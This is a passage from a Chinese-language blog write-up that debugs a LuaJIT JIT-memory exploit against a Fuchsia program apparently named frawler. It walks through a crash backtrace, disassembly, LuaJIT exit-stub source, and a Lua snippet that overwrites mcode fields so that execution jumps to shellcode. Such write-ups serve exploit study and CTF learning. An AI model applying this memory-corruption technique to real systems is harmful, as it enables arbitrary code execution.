[40698.192] 01105.01119&amp;gt; {{{mmap:0x2f6fae1d2000:0x9000:load:0x21fb5448:rw:0xc9000}}}
[40698.192] 01105.01119&amp;gt; {{{module:0x21fb5449:&amp;lt;VMO#1033=vdso/full&amp;gt;:elf:89d4eb99573947ac792dd4a5e9e498bd44b4eefe}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x554a3ca5d000:0x7000:load:0x21fb5449:r:0}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x554a3ca64000:0x1000:load:0x21fb5449:rx:0x7000}}}
[40698.192] 01105.01119&amp;gt; {{{module:0x21fb544a:&amp;lt;VMO#162604=ld.so.1&amp;gt;:elf:8f51b7868dd0d5b9aefede5739518f97f2a580e0}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x58f25e8e0000:0xcb000:load:0x21fb544a:rx:0}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x58f25e9ac000:0x6000:load:0x21fb544a:rw:0xcc000}}}
[40698.192] 01105.01119&amp;gt; {{{module:0x21fb544b:&amp;lt;VMO#162591=/pkg/bin/frawler&amp;gt;:elf:333103e7c266dfce}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x7a8af118e000:0x1d000:load:0x21fb544b:r:0}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x7a8af11ab000:0x57000:load:0x21fb544b:rx:0x1d000}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x7a8af1202000:0x4000:load:0x21fb544b:rw:0x74000}}}
[40698.196] 01105.01119&amp;gt; bt#01: pc 0x7a8af11e4b20 sp 0x799649e95c78 (app:/pkg/bin/frawler,0x56b20)
[40698.196] 01105.01119&amp;gt; bt#02: pc 0x7a8af11e4acc sp 0x799649e95c80 (app:/pkg/bin/frawler,0x56acc)
[40698.197] 01105.01119&amp;gt; bt#03: pc 0x7a8af11c7474 sp 0x799649e95cb0 (app:/pkg/bin/frawler,0x39474)
[40698.198] 01105.01119&amp;gt; bt#04: pc 0x7a8af11c5e0d sp 0x799649e95d00 (app:/pkg/bin/frawler,0x37e0d)
[40698.198] 01105.01119&amp;gt; bt#05: pc 0x7a8af11ff4f6 sp 0x799649e95d40 (app:/pkg/bin/frawler,0x714f6)
[40698.205] 01105.01119&amp;gt; bt#06: pc 0x7a8af11b0547 sp 0x799649e95d90 (app:/pkg/bin/frawler,0x22547)
[40698.209] 01105.01119&amp;gt; bt#07: pc 0x7a8af11b03a5 sp 0x799649e95db0 (app:/pkg/bin/frawler,0x223a5)
[40698.209] 01105.01119&amp;gt; bt#08: pc 0x7a8af1200af1 sp 0x799649e95e00 (app:/pkg/bin/frawler,0x72af1)
[40698.210] 01105.01119&amp;gt; bt#09: pc 0x7a8af11b3218 sp 0x799649e95e50 (app:/pkg/bin/frawler,0x25218)
[40698.210] 01105.01119&amp;gt; bt#10: pc 0x7a8af11f9f49 sp 0x799649e95e90 (app:/pkg/bin/frawler,0x6bf49)
[40698.211] 01105.01119&amp;gt; bt#11: pc 0x7a8af11fa0c6 sp 0x799649e95ec0 (app:/pkg/bin/frawler,0x6c0c6)
[40698.211] 01105.01119&amp;gt; bt#12: pc 0x7a8af11fa270 sp 0x799649e95f10 (app:/pkg/bin/frawler,0x6c270)
[40698.211] 01105.01119&amp;gt; bt#13: pc 0x58f25e8f9c48 sp 0x799649e95f60 (libc.so,0x19c48)
[40698.215] 01105.01119&amp;gt; bt#14: pc 0 sp 0x799649e96000
[40698.215] 01105.01119&amp;gt; bt#15: end
[40698.218] 01105.01119&amp;gt; {{{bt:1:0x7a8af11e4b20}}}
[40698.222] 01105.01119&amp;gt; {{{bt:2:0x7a8af11e4acc}}}
[40698.222] 01105.01119&amp;gt; {{{bt:3:0x7a8af11c7474}}}
[40698.223] 01105.01119&amp;gt; {{{bt:4:0x7a8af11c5e0d}}}
[40698.223] 01105.01119&amp;gt; {{{bt:5:0x7a8af11ff4f6}}}
[40698.224] 01105.01119&amp;gt; {{{bt:6:0x7a8af11b0547}}}
[40698.224] 01105.01119&amp;gt; {{{bt:7:0x7a8af11b03a5}}}
[40698.224] 01105.01119&amp;gt; {{{bt:8:0x7a8af1200af1}}}
[40698.226] 01105.01119&amp;gt; {{{bt:9:0x7a8af11b3218}}}
[40698.226] 01105.01119&amp;gt; {{{bt:10:0x7a8af11f9f49}}}
[40698.227] 01105.01119&amp;gt; {{{bt:11:0x7a8af11fa0c6}}}
[40698.227] 01105.01119&amp;gt; {{{bt:12:0x7a8af11fa270}}}
[40698.228] 01105.01119&amp;gt; {{{bt:13:0x58f25e8f9c48}}}
[40698.229] 01105.01119&amp;gt; {{{bt:14:0}}}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据之前我们调exp的时候，知道aslr的情况来看，非常明显我们没能跳到shellcode执行，死在中间了。&lt;/p&gt;&lt;p&gt;幸运的是dump里给出了bt，所以来跟一下，看看是死在哪儿了。在这种时候，如果你之前完整跟了上一篇里的luajit代码，并且自己看了一遍，日子就好过多了，毕竟流程上差异不大。&lt;/p&gt;&lt;p&gt;首先是&lt;code&gt;0x56b20&lt;/code&gt;，直接原因。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;LOAD:0000000000056B1B mov     ecx, esi
LOAD:0000000000056B1D shl     ecx, 5
LOAD:0000000000056B20 mov     byte ptr [rax], 6Ah ; &#39;j&#39;
LOAD:0000000000056B23 mov     [rax+1], cl
LOAD:0000000000056B26 mov     r9d, esi
LOAD:0000000000056B29 and     r9d, 7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;rax目前的值为0x8000，显然放不进去，但是仔细一看这个结构：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3c40829a650f96ab57be6975d78f8601_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; class=&quot;content_image&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3c40829a650f96ab57be6975d78f8601_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; class=&quot;content_image lazy&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-3c40829a650f96ab57be6975d78f8601_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这不就是上一篇里的&lt;code&gt;asm_exitstub_gen&lt;/code&gt;么？但是看起来这个死的位置有点奇怪啊，应该是死在了赋值给&lt;code&gt;mxp&lt;/code&gt;的时候了。回顾一下代码：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* Generate an exit stub group at the bottom of the reserved MCode memory. */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;asm_exitstub_gen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASMState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExitNo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ExitNo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;groupofs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXITSTUBS_PER_GROUP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;MCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mcbot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;MCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxpstart&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXITSTUBS_PER_GROUP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mctop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;asm_mclimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* Push low byte of exitno for each exit stub. */&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;XI_PUSHi8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;groupofs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 应该是这里死了&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EXITSTUBS_PER_GROUP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;XI_JMPs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXITSTUBS_PER_GROUP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;XI_PUSHi8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;groupofs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* Push the high byte of the exitno for each exit stub group. */&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;XI_PUSHi8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXITSTUBS_PER_GROUP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* Store DISPATCH at original stack slot 0. Account for the two push ops. */&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;XI_MOVmi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MODRM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XM_OFS8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RID_ESP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MODRM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XM_SCALE1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RID_ESP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RID_ESP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr2addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J2GG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* Jump to exit handler which fills in the ExitState. */&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;XI_JMP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jmprel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lj_vm_exit_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* Commit the code for this group (even if assembly fails later on). */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;lj_mcode_commitbot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mcbot&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mxp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mclim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mcbot&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MCLIM_REDZONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mxpstart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再对比一下寄存器值，这里mxp其实是&lt;code&gt;mcbot&lt;/code&gt;，但是这里的值是0x8000，0x8000按理说是我设置的&lt;code&gt;mctab[3]&lt;/code&gt;，也就是&lt;code&gt;szmcarea&lt;/code&gt;的值吧？&lt;/p&gt;&lt;p&gt;回顾一下结构：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;  mcprot = 0x0, 
  mcarea = 0x1234 &amp;lt;error: Cannot access memory at address 0x1234&amp;gt;, 
  mctop = 0x4321 &amp;lt;error: Cannot access memory at address 0x4321&amp;gt;, 
  mcbot = 0xdead &amp;lt;error: Cannot access memory at address 0xdead&amp;gt;, 
  szmcarea = 0xbeef, 
  szallmcarea = 0x1000, 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那么这里岂不是，错了个位？回想一下最开始的exp，好像这里就是错了个位啊.&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f71f3a12a3d4fa154933216e608d3432_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;233&quot; data-rawheight=&quot;216&quot; class=&quot;content_image&quot; width=&quot;233&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f71f3a12a3d4fa154933216e608d3432_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;233&quot; data-rawheight=&quot;216&quot; class=&quot;content_image lazy&quot; width=&quot;233&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-f71f3a12a3d4fa154933216e608d3432_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;为了保证我们的判断没有错，我们再魔改一下看看。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;    local mcarea = mctab[1]
    mctab[0] = 0x1234/ 2^52 / 2^1022
    mctab[1] = 0x4321/ 2^52 / 2^1022
    mctab[2] = 0xdead / 2^52 / 2^1022
    mctab[3] = asaddr / 2^52 / 2^1022
    mctab[4] = 2^12 / 2^52 / 2^1022
    --while mctab[0] == 0 do end
    local i = 1
    while i &amp;lt; 0x1000000 do 
        i = i + 1 
        --print(i)
    end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;崩溃位置在&lt;code&gt;0x2bd70&lt;/code&gt;，此时&lt;code&gt;rdi&lt;/code&gt;为`0x4321。&lt;/p&gt;&lt;p&gt;和源码对比之后是可以确认这个函数的：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lj_mcode_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rax&lt;/span&gt;
